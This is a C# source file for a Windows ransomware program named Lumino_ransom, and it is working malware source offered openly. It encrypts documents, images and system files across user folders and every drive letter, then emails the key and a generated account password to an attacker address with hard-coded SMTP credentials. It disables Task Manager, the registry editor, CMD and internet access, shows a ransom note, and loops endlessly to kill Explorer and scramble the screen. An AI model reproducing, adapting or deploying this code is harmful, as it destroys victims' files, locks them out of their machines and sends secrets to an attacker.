
/*
      ___       ___           ___                       ___           ___                             ___           ___           ___           ___           ___           ___                     
     /\__\     /\__\         /\__\          ___        /\__\         /\  \                           /\  \         /\  \         /\__\         /\  \         /\  \         /\__\                    
    /:/  /    /:/  /        /::|  |        /\  \      /::|  |       /::\  \                         /::\  \       /::\  \       /::|  |       /::\  \       /::\  \       /::|  |                   
   /:/  /    /:/  /        /:|:|  |        \:\  \    /:|:|  |      /:/\:\  \                       /:/\:\  \     /:/\:\  \     /:|:|  |      /:/\ \  \     /:/\:\  \     /:|:|  |                   
  /:/  /    /:/  /  ___   /:/|:|__|__      /::\__\  /:/|:|  |__   /:/  \:\  \                     /::\~\:\  \   /::\~\:\  \   /:/|:|  |__   _\:\~\ \  \   /:/  \:\  \   /:/|:|__|__                 
 /:/__/    /:/__/  /\__\ /:/ |::::\__\  __/:/\/__/ /:/ |:| /\__\ /:/__/ \:\__\                   /:/\:\ \:\__\ /:/\:\ \:\__\ /:/ |:| /\__\ /\ \:\ \ \__\ /:/__/ \:\__\ /:/ |::::\__\                
 \:\  \    \:\  \ /:/  / \/__/~~/:/  / /\/:/  /    \/__|:|/:/  / \:\  \ /:/  /                   \/_|::\/:/  / \/__\:\/:/  / \/__|:|/:/  / \:\ \:\ \/__/ \:\  \ /:/  / \/__/~~/:/  /                
  \:\  \    \:\  /:/  /        /:/  /  \::/__/         |:/:/  /   \:\  /:/  /                       |:|::/  /       \::/  /      |:/:/  /   \:\ \:\__\    \:\  /:/  /        /:/  /                 
   \:\  \    \:\/:/  /        /:/  /    \:\__\         |::/  /     \:\/:/  /                        |:|\/__/        /:/  /       |::/  /     \:\/:/  /     \:\/:/  /        /:/  /                  
    \:\__\    \::/  /        /:/  /      \/__/         /:/  /       \::/  /                         |:|  |         /:/  /        /:/  /       \::/  /       \::/  /        /:/  /                   
     \/__/     \/__/         \/__/                     \/__/         \/__/                           \|__|         \/__/         \/__/         \/__/         \/__/         \/__/                    

     __ __             __     
    /\ \\ \          /'__`\   
    \ \ \\ \        /\ \/\ \  
     \ \ \\ \_      \ \ \ \ \ 
      \ \__ ,__\ __  \ \ \_\ \
       \/_/\_\_//\_\  \ \____/
          \/_/  \/_/   \/___/ 
                          
          

*/
using System;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Runtime.InteropServices;
using GlobalHook;
using Microsoft.Win32;
using System.Diagnostics;
using ASCII;
using CMD;
using animANDNCS;
using System.Drawing;
using System.Collections;
using Lumino_ransom.Properties;
using System.Windows.Media;
using Brushes = System.Drawing.Brushes;

namespace Lumino_ransom
{
    public partial class Form1 : Form
    {

        readonly string userName = Environment.UserName;
        readonly string computerName = System.Environment.MachineName.ToString();
        readonly string userDir = "C:\\Users\\";

        private const int WS_SYSMENU = 0x80000;

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.Style &= ~WS_SYSMENU;
                return cp;
            }
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public Form1()
        {

            this.WindowState = FormWindowState.Minimized;
            InitializeComponent();
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;

            StartAction();

        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        private void SendPassword(string password, string UserPass)
        {
            try
            {
                string info = computerName + "-_-" + userName + "    PASS: " + password + "      User_Admin Pass: " + UserPass;
                var fromAddress = new MailAddress("lumino110908@gmail.com", "Ransom");
                var toAddress = new MailAddress("ware.ransom@yahoo.com", "Ransom");
                const string fromPassword = "Lumino1109";
                const string subject = "Ransom_Key";
                var smtp = new SmtpClient
                {
                    Host = "smtp-mail.outlook.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential("lumino110908@gmail.com", fromPassword)

                };
                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    Body = info
                })
                {
                    smtp.Send(message);
                }
            }
            catch (System.Net.Mail.SmtpException) { }
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        public void EncryptFile(string file, string password)
        {
            try
            {
                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                // Hash the password with SHA256
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                File.WriteAllBytes(file, bytesEncrypted);
                System.IO.File.Move(file, file + ".lumino_locked");
            }
            catch (System.IO.IOException) { };

        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Pass_crypter()
        {
            try
            {
                string password = CreatePassword(15);
                string startPath = userDir + userName + "\\Documents";
                string startPath2 = userDir + userName + "\\Desktop";
                string startPath3 = userDir + userName + "\\Pictures";
                string startPath4 = userDir + userName + "\\Videos";
                string startPath5 = userDir + userName + "\\Music";
                string startPath6 = userDir + userName + "\\Downloads";
                EncryptDirectory(startPath, password);
                EncryptDirectory(startPath2, password);
                EncryptDirectory(startPath3, password);
                EncryptDirectory(startPath4, password);
                EncryptDirectory(startPath5, password);
                EncryptDirectory(startPath6, password);
                EncryptDirectory("A:\\", password);
                EncryptDirectory("B:\\", password);
                EncryptDirectory("C:\\", password);
                EncryptDirectory("D:\\", password);
                EncryptDirectory("E:\\", password);
                EncryptDirectory("F:\\", password);
                EncryptDirectory("G:\\", password);
                EncryptDirectory("H:\\", password);
                EncryptDirectory("I:\\", password);
                EncryptDirectory("J:\\", password);
                EncryptDirectory("K:\\", password);
                EncryptDirectory("L:\\", password);
                EncryptDirectory("M:\\", password);
                EncryptDirectory("N:\\", password);
                EncryptDirectory("O:\\", password);
                EncryptDirectory("P:\\", password);
                EncryptDirectory("Q:\\", password);
                EncryptDirectory("R:\\", password);
                EncryptDirectory("S:\\", password);
                EncryptDirectory("T:\\", password);
                EncryptDirectory("U:\\", password);
                EncryptDirectory("V:\\", password);
                EncryptDirectory("W:\\", password);
                EncryptDirectory("X:\\", password);
                EncryptDirectory("Y:\\", password);
                EncryptDirectory("Z:\\", password);
            }
            catch (System.UnauthorizedAccessException) { }
            catch (System.IO.DirectoryNotFoundException) { }
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
        public void EncryptDirectory(string location, string password)
        {
            try
            {
                //extensions to be encrypt
                var validExtensions = new[]
                {
              ".log", ".sys", ".dll", ".md", ".exe", ".lnk", ".JPG", ".h", ".c", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".ini", ".inf"
            };

                var files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension))
                    {
                        EncryptFile(files[i], password);
                    }

                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    EncryptDirectory(childDirectories[i], password);
                }
            }
            catch (System.IO.IOException) { }
            catch (System.UnauthorizedAccessException) { }
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void StartAction()
        {
            StartAction_Organisation() ;
        }


        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        [DllImport("user32")]
        public static extern int SetCursorPos(int x, int y);

        private readonly UserActivityHook _gHook = new UserActivityHook();


        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Send_keys()
        {
            try
            {
                SetCursorPos(500, 615);
                this._gHook.Start_mouse();
                SendKeys.Send("EN: {ENTER}Hi !!! {ENTER}Your file was encrypted by the ransomware: Lumino_Ransom, if you want to decrypt him, send me à mail with the user name pc at ware.ransom@yahoo.com and I give to you the password (for free ;) that you need to enter in Lumino_decrypt ! On the other hand, you have no luck, it's the Hard's version of my Ransomware that I've created then... {ENTER} {ENTER}");
                SendKeys.Send("FR: {ENTER}Salut !!! {ENTER}Vos fichier on été encypté par le ransomware: Lumino_ransom, si tu veux les décryptés, envoie moi un mail avec ton nom d'utilisateur à ware.ransom@yahoo.com et je te donnerais le mot de passe (gratuitement ;) qu'il faudra entrer dans Lumino_decrypt ! Par contre, t'as pas de chance, c'est la version Hard mon Ransomware que j'ai crée donc...");
                SendKeys.Send("{ENTER} {ENTER}The window/notepad gonna be closed automaticaly after 20 secondes !");
                SendKeys.Send("{ENTER}La fenettre/le bloc note vas être fermé(e) automatiquement après 20 secondes !");
                this._gHook.Stop_mouse();
                System.Threading.Thread.Sleep(20000);
                SendKeys.Send("%+{F4}{RIGHT}{ENTER}");
            }
            catch (System.ComponentModel.Win32Exception) { };


        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void FileLumine()
        {
            try
            {
                int compteur = 0;
                int number_txt = 1;
                while (compteur < 400)
                {
                    string fichier = "\\Desktop\\Lumine";
                    string FileDeskpath = userDir + userName + fichier + number_txt;
                    number_txt++;
                    System.IO.File.Create(FileDeskpath);
                    compteur++;


                }
            }
            catch (System.IO.IOException) { };
        }



        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ///
        public void Programtxt()
        {
            Process mtd = new Process();
            mtd.StartInfo.FileName = "notepad.exe";
            mtd.StartInfo.Arguments = "Lumino Helper";
            mtd.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
            mtd.Start();
            System.Threading.Thread.Sleep(500);
            SendKeys.Send("{ENTER}");
            System.Threading.Thread.Sleep(2000);
        }


        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Finish_infini()
        {
            string cbCursorSize = "1";
            int cursorSize = Int32.Parse(cbCursorSize);
            int parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
            //0x2029 not documented windows SPI number to change cursor size
            SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);

            int infini = 2;
            while (infini > 1)
            {
                try
                {
                    timer1.Stop();
                    CMD.CMD_rtd();
                    Random aleatoire = new Random();
                    int entier = aleatoire.Next(30001);
                    anim_NCS.Del_NCS_Ani2();
                    cbCursorSize = "15";
                    cursorSize = Int32.Parse(cbCursorSize);
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
                    CMD.CMD_rtd();
                    System.Threading.Thread.Sleep(entier--);
                    System.Diagnostics.Process.Start("https://www.bing.com/search?ptag=ICO-e5da190ded9a292e&form=INCOH1&pc=1CDT&q=Ransomware");
                    timer1.Start();
                    timer2.Start();
                    timer3.Start();
                    timer4.Start();
                    this._gHook.Start_key();
                    cbCursorSize = "1";
                    cursorSize = Int32.Parse(cbCursorSize);
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
                    CMD.CMD_rtd();
                    System.Threading.Thread.Sleep(entier++);
                    CMD.CMD_killExplorer();
                    cbCursorSize = "5";
                    cursorSize = Int32.Parse(cbCursorSize);
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
                    System.Diagnostics.Process.Start("https://www.google.com/search?ptag=ICO-e5da190ded9a292e&form=INCOH1&pc=1CDT&q=Ransomware");
                    System.Threading.Thread.Sleep(entier--);
                    this._gHook.Stop_key();
                    timer1.Stop();
                    Programtxt();
                    this._gHook.Start_mouse();
                    SendKeys.Send("RANSOMWARE{ENTER}");
                    CMD.CMD_startExplorer();
                    CMD.CMD_rtd();
                    cbCursorSize = "2";
                    cursorSize = Int32.Parse(cbCursorSize);
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
                    anim_NCS.Del_NCS_Ani2();
                    CMD.CMD_rtd();
                    System.Threading.Thread.Sleep(entier--);
                    anim_NCS.Del_NCS_Ani2();
                    cbCursorSize = "9";
                    cursorSize = Int32.Parse(cbCursorSize);
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
                    SendKeys.Send("ware.ransom@yahoo.com !");
                    CMD.CMD_killExplorer();
                    this._gHook.Start_key();
                    timer1.Start();
                    this._gHook.Stop_mouse();
                    CMD.CMD_rtd();
                    SetCursorPos(500, 5);
                    System.Threading.Thread.Sleep(entier++);
                    SetCursorPos(1000, 891);
                    System.Threading.Thread.Sleep(entier++);
                    SetCursorPos(60, 967);
                    CMD.CMD_startExplorer();
                    cbCursorSize = "3";
                    cursorSize = Int32.Parse(cbCursorSize);
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
                    CMD.CMD_rtd();
                    System.Threading.Thread.Sleep(entier--);
                    this._gHook.Stop_key();
                    CMD.CMD_killExplorer();
                    CMD.CMD_rtd();
                    cbCursorSize = "8";
                    cursorSize = Int32.Parse(cbCursorSize);
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
                    anim_NCS.Del_NCS_Ani2();
                    CMD.CMD_startExplorer();
                    CMD.CMD_startExplorer();
                    Gdi_Load();
                }
                catch (System.Exception) { };
                infini = infini++;
            }

        }



        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);

        const int SPI_SETCURSORS = 0x0057;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;

        const string regKey = "HKEY_CURRENT_USER\\Control Panel\\Cursors";
        const string WIN_CUR_PATH = "C:\\Windows\\Cursors";

        readonly string[] CURSOR_NAMES = {
                "Lumino.cur"         //Normal Select
    };

        private void Cursor_Changer()
        {
            string cbCursorSize = "15";
            int cursorSize = Int32.Parse(cbCursorSize);
            int parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
            //0x2029 not documented windows SPI number to change cursor size
            SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);
            try
            {
                string folder_name = new DirectoryInfo("Lumino").Name;
                string cursor_shceme = "";

                foreach (string val in CURSOR_NAMES)
                {
                    //C:\\등 경로일 경우 일반 경로와 다르게 \\를 포함하고 있기 때문에 \\를 삭제

                    string cursorPath = val;

                    string currentCursorPath = WIN_CUR_PATH + '\\' + folder_name + "_" + val;
                    cursor_shceme += currentCursorPath + ",";
                    File.Copy(cursorPath, currentCursorPath, true);
                    Registry.SetValue(regKey, "Arrow", currentCursorPath);
                    SystemParametersInfo(SPI_SETCURSORS, 0, 0, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                }
                SystemParametersInfo(SPI_SETCURSORS, 0, 0, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                System.Threading.Thread.Sleep(5);
                Registry.SetValue(regKey + "\\Schemes", folder_name, cursor_shceme.TrimEnd(), RegistryValueKind.ExpandString);
                SystemParametersInfo(SPI_SETCURSORS, 0, 0, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            }
            catch (System.IO.FileNotFoundException) { }
            catch (System.IO.IOException) { }
            catch (SystemException) { }
        }

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        private readonly CMD_class CMD = new CMD_class();
        private readonly ASCII_class Ascii = new ASCII_class();
        private readonly Anim_NCS anim_NCS = new Anim_NCS();
        private readonly Disable_All Disable = new Disable_All();
        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        public void Vertex_Main()
        {
            SHDocVw.ShellWindows shellWindows = new SHDocVw.ShellWindows();
            string filename;
            ArrayList windows = new ArrayList();

            int infini = 2;
            while (infini > 1)
            {
                foreach (SHDocVw.InternetExplorer explorerwindow in shellWindows)
                {
                    filename = Path.GetFileNameWithoutExtension(explorerwindow.FullName).ToLower();
                    if (filename.Equals("explorer"))
                    {
                        Graphics g = Graphics.FromHwnd((IntPtr)explorerwindow.HWND);

                        g.FillRectangle(Brushes.Blue, new Rectangle(4, 26, 10000, 10000));
                        System.Threading.Thread.Sleep(150);
                        g.FillRectangle(Brushes.Red, new Rectangle(4, 26, 10000, 10000));
                        System.Threading.Thread.Sleep(150);
                        g.FillRectangle(Brushes.Green, new Rectangle(4, 26, 10000, 10000));
                        System.Threading.Thread.Sleep(150);
                        g.FillRectangle(Brushes.Firebrick, new Rectangle(4, 26, 10000, 10000));
                        System.Threading.Thread.Sleep(150);
                        g.FillRectangle(Brushes.Gold, new Rectangle(4, 26, 10000, 10000));
                        System.Threading.Thread.Sleep(150);
                    }

                    infini = infini++;

                }
            }
        }

        public string CreatePassword2(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        public void CreateUser_Admin(string UserPass)
        {
            string commande = "/C net localgroup Lumino_Ransom " + UserPass + " /add";
            System.Threading.Thread.Sleep(1000);
            Process mtd = new Process();
            mtd.StartInfo.FileName = "cmd.exe";
            mtd.StartInfo.Arguments = commande;
            mtd.StartInfo.UseShellExecute = true;
            mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            mtd.Start();
            mtd.Close();
        }

        public void StartAction_Organisation()
        {
           try
            {

                //1
                string UserPass = CreatePassword2(5);
                string password = CreatePassword(15);
                string path = "\\Desktop";
                string startPath = userDir + userName + path;
                string cbCursorSize = "10";
                int cursorSize = Int32.Parse(cbCursorSize);
                int parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);
                SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);

                //2
                CreateUser_Admin(UserPass);
                CMD.Users_Chiants(400);
                System.Threading.Thread.Sleep(2000);
                anim_NCS.Del_NCS_Ani();
                System.Threading.Thread.Sleep(2000);
                Ascii.ASCII_Art();
                Music.Play();
                Vertex_Main();
                timer2.Start();
                System.Threading.Thread.Sleep(2000);
                CMD.Registry_Copy();
                
                //3
                timer4.Start();
                System.Threading.Thread.Sleep(2000);
                Disable.Disble_Taskmgr();
                System.Threading.Thread.Sleep(2000);
                Disable.Disble_Registry();
                Disable.Disable_Parameter();
                System.Threading.Thread.Sleep(2000);
                SendPassword(password, UserPass);
                System.Threading.Thread.Sleep(2000);
                Pass_crypter();

                //4
                timer3.Start();
                System.Threading.Thread.Sleep(2000);
                FileLumine();
                System.Threading.Thread.Sleep(2000);
                Disable.Disble_CMD();
                System.Threading.Thread.Sleep(2000);
                CMD.CMD_rtd();
                System.Threading.Thread.Sleep(2000);
                Cursor_Changer();
                System.Threading.Thread.Sleep(5000);
                Disable.Internet_Dis();

                //5
                timer4.Stop();
                Programtxt();
                Send_keys();
                System.Threading.Thread.Sleep(2000);
                CMD.CMD_rtd();
                System.Threading.Thread.Sleep(2000);

                //6
                timer1.Start();
                anim_NCS.Del_NCS_Ani2();
                System.Threading.Thread.Sleep(2000);
                Finish_infini();


            }
            catch (System.Exception) { };
            
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
        }

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            ExtractIconEx(file, number, out IntPtr large, out IntPtr small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }



        public void Gdi_Load()
        {
            timer1.Start();
            timer2.Start();
            timer3.Start();
            timer4.Start();
        }

        Random r;

        public void Timer1_Tick(object sender, EventArgs e)
        {
            r = new Random();
            if (timer1.Interval > 300)
            {
                timer1.Interval -= 150;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else if (timer1.Interval > 151)
            {
                timer1.Interval -= 100;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            }
            else
            {
                timer1.Interval = 5;
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC(hwnd);
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                StretchBlt(hdc, r.Next(10), r.Next(10), x - r.Next(25), y - r.Next(25), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
                StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);

            }
        }

        readonly Icon icon = Extract("shell32.dll", 235, true);

        public void Timer2_Tick(object sender, EventArgs e)
        {
            this.Cursor = new Cursor(Cursor.Current.Handle);
            int posX = Cursor.Position.X;
            int posY = Cursor.Position.Y;

            IntPtr desktop = GetWindowDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktop))
            {
                g.DrawIcon(icon, posX, posY);
            }
        }

        public void Timer3_Tick(object sender, EventArgs e)
        {
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer3.Interval = r.Next(5000);
        }

        public void Timer4_Tick(object sender, EventArgs e)
        {
            r = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, r.Next(x), r.Next(y), x = r.Next(500), y = r.Next(500), hdc, 0, 0, x, y, TernaryRasterOperations.NOTSRCCOPY);
            timer4.Interval = r.Next(1000);
            //InvalidateRect(IntPtr.Zero, IntPtr.Zero, true); // for erase hdc(graphics payloads)
        }

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        readonly System.Media.SoundPlayer Music = new System.Media.SoundPlayer(Resources.Adele);
    }


    //public partial class

}

//namespace